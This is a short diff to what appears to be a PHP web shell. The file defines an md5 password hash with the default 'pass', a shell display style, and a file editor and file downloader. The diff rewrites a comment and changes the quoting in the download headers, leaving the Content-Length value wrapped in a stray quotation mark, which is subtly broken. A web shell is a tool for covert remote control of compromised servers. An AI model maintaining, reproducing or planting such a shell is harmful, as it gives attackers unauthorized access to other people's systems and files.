@@ -1,6 +1,6 @@
 <?php 
 
-define("PASSWORD", "1a1dc91c907325c69271ddf0c944bc72");  // Your password ( md5 ) Default : pass 
+define("PASSWORD", "1a1dc91c907325c69271ddf0c944bc72");  //  Password ( md5 ) Default : pass 
 define("STYLE", "dark");  // Shell style ( dark / light ) 
 
 
@@ -338,8 +338,8 @@ class FileEditor
 
 function FileDownloader($file) 
 {
-	header("Content-Disposition: attachment; filename=" . @basename($file) . "\"");
-	header("Content-Length: " . @filesize($file) . "\"");
+	header("Content-Disposition: attachment; filename=\"" . @basename($file) . "\"");
+	header("Content-Length: \"" . @filesize($file) . "\"");
 	header("Content-Type: application/octet-stream;");
 	@readfile($file);
 	exit();
